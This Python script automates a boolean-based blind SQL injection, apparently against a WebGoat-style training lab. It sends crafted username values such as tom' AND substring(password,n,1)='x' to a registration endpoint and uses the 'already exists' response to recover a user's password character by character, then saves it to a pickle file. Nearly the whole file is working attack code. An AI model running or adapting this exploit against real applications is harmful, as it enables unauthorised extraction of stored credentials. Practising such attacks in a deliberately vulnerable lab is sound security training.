from res import URL
import string
import requests
import json
import pickle


def print_password():
    print(f'Password: {pickle.load(open("outputs/password.pkl", "rb"))}')


def get_password(cookie):
    alphabet_index = 0
    alphabet = string.ascii_letters
    password_index = 0
    password = ''
    no_of_queries = 0

    headers = {
        'Cookie': cookie,
    }

    while True:
        query = f'tom\' AND substring(password,{password_index + 1},1)=\'{alphabet[alphabet_index]}'
        print(query)
        no_of_queries += 1
        data = {
            'username_reg': query,
            'email_reg': 'paul@gmail.com',
            'password_reg': 'paul123',
            'confirm_password_reg': 'paul123'
        }

        r = requests.put(URL, headers=headers, data=data)

        try:
            response = json.loads(r.text)

        except:
            print("Wrong JSESSIONID, find it by looking at your requests once logged in.")
            return

        if "already exists please try to register with a different username" not in response['feedback']:
            alphabet_index += 1
            if alphabet_index > len(alphabet) - 1:
                pickle.dump(password, open("outputs/password.pkl", "wb"))
                print(f'No of queries: {no_of_queries}')
                return password
        else:
            password += alphabet[alphabet_index]
            print(password)
            alphabet_index = 0
            password_index += 1
